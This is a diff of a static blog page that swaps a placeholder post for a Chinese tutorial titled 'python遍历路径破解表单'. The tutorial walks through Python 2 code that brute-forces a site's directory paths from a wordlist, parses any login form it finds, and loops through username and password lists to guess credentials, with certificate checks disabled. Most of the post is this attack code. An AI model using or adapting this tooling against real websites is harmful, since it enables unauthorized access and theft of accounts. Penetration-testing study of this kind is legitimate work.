@@ -19,7 +19,7 @@
     <meta name="description" content="One way to choose one">
     <meta name="author" content="Misaki">
     <meta name="keywords" content="">
-    <title>新的开始！ ~ Misaki&#39;s Blog</title>
+    <title>python遍历路径破解表单 ~ Misaki&#39;s Blog</title>
     <link rel="stylesheet" href="/css/Material_Icons.css">
     <!-- <link rel="stylesheet" href="/css/font-awesome.css"> -->
     <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/font-awesome/latest/css/font-awesome.min.css">
@@ -85,8 +85,8 @@
   <div class="page-header header-filter" data-parallax="true" style="background-image: url('/img/post-banner.jpg'); height: 70vh;">
     
       <div class="container">
-        <h1 class="title text-center post_title">新的开始！</h1>
-        <p class="text-center"><b>Tuesday, September 18th 2018, 12:32 am</b></p>
+        <h1 class="title text-center post_title">python遍历路径破解表单</h1>
+        <p class="text-center"><b>Tuesday, March 12th 2019, 10:35 am</b></p>
       </div>
     
   </div>
@@ -100,22 +100,73 @@
       <div class="container">
         <div class="section">
           <div class="post_content">
-              <p>记录自己某些时候的学习，和某些突发奇想。简而言之就是为了防止忘记某些自己需要的东西。</p>
+              <h3 id="python遍历路径破解表单"><a href="#python遍历路径破解表单" class="headerlink" title="python遍历路径破解表单"></a>python遍历路径破解表单</h3><p>​    首先是利用python遍历路径，采用字典爆破的形式，当然如果只是单纯的爆破路径，简单写一个多线程脚本就行了。这里考虑如何对爆破到的路径进行第二步利用，此处尝试对猜解到的路径进行表单发现及登陆爆破处理。</p>
+<p>​    首先就是路径爆破，采用多线程队列，爆破路径，判断形式为200响应码。</p>
+<pre><code>        while not self._queue.empty():
+            queue = self._queue.get(timeout=0.5)
+            try:
+                r = requests.get(self.url+queue,timeout=5, headers=self.headers)
+                if r.status_code == 200:
+                    print &quot;[200] %s&quot; %(queue)
+                    soup = BeautifulSoup(r.content,&#39;html.parser&#39;)
+                    if soup.find(&#39;form&#39;):
+                        self.brute(soup, queue)
+</code></pre><p>猜解到路径后交给brute方法处理，方法实现了一个css选择器，获取form表单中的input字段标签，提取标签参数组合成post参数值，然后提取表单中的action跳转页面，如没有页面默认在当前表单页提交。</p>
+<pre><code>input = soup.select(&quot;form input&quot;)
+            for i in input:
+                try:
+                    if i.attrs[&#39;type&#39;] == &quot;hidden&quot;:
+                        name, value = i.attrs[&#39;name&#39;], i.attrs[&#39;value&#39;]
+                        list_post.append(name+&#39;=&#39;+value)
+                    elif i.attrs[&#39;type&#39;] == &#39;password&#39;:
+                        name = i.attrs[&#39;name&#39;]
+                        list_post.append(name+&#39;=$$$&#39;)
+                    else:
+                        name = i.attrs[&#39;name&#39;]
+                        list_post.append(name+&#39;=%%%&#39;)
+                except:
+                    continue
+            for i in list_post:
+                post = post + i + &#39;&amp;&#39;
+            action = soup.find_all(&#39;form&#39;)
+            for i in action:
+                if i[&#39;action&#39;]:
+                    actiontag = i[&#39;action&#39;]
+                else:
+                    actiontag = queue
+            self.payload(post, actiontag)
+</code></pre><p>获取参数值后，交给payload方法处理登陆，采用requests库的session登陆。获取cookie，先采用session请求获取cookie后，再采用session携带cookie进行请求提交。然后对输入的验证值进行判断是否为登陆成功。</p>
+<pre><code>        for name in self.username():
+            post_user = post.replace(&#39;%%%&#39;,name.strip())
+            for pwd in self.password():
+                post_pwd = post_user.replace(&#39;$$$&#39;,pwd.strip())
+                session = requests.Session()
+                session.get(self.url+&#39;/&#39;+action, headers=self.headers, verify=False)
+                r = session.post(self.url+&#39;/&#39;+action, data=post_pwd, headers=self.headers, verify=False)
+                if self.word in r.content:
+                    print &#39;[username] %s&#39; %name +&#39;\r&#39; + &#39;[password] %s&#39; %pwd
+                    return
 
+</code></pre><p>为了判断是否登陆成功，采用的人为输入判断字符串的形式。也就是脚本执行形式为</p>
+<pre><code>python xxx.py http://xxxx.com xxxxx
+</code></pre>
           </div>
           <br><br>
               
                 <div class="license-wrapper">
                     <p>原文作者：<a href="">Misaki</a>
-                    <p>原文链接：<a href="/2018/09/新的开始！/">/2018/09/新的开始！/</a>
-                    <p>发表日期：<a href="/2018/09/新的开始！/">September 18th 2018, 12:32:10 am</a>
-                    <p>更新日期：<a href="/2018/09/新的开始！/">March 12th 2019, 10:57:01 am</a>
+                    <p>原文链接：<a href="/2019/03/python遍历路径破解表单/">/2019/03/python遍历路径破解表单/</a>
+                    <p>发表日期：<a href="/2019/03/python遍历路径破解表单/">March 12th 2019, 10:35:27 am</a>
+                    <p>更新日期：<a href="/2019/03/python遍历路径破解表单/">March 12th 2019, 10:53:37 am</a>
                     <p>版权声明：本文采用<a rel="license" href="http://creativecommons.org/licenses/by-nc/4.0/">知识共享署名-非商业性使用 4.0 国际许可协议</a>进行许可</p>
                 </div>
               
           <br><br>
           <div>
               <p>
+                       
+                      <span class="badge badge-default">#&nbsp;python</span>
+                      &nbsp;
                       
               </p>
           </div>
@@ -145,8 +196,8 @@
     <script>               
         var disqus_shortname = '';
         var disqus_config = function () {
-            this.page.url = '/2018/09/新的开始！/'; 
-            this.page.identifier = '/2018/09/新的开始！/';
+            this.page.url = '/2019/03/python遍历路径破解表单/'; 
+            this.page.identifier = '/2019/03/python遍历路径破解表单/';
         };
         (function() { 
             var d = document, s = d.createElement('script');
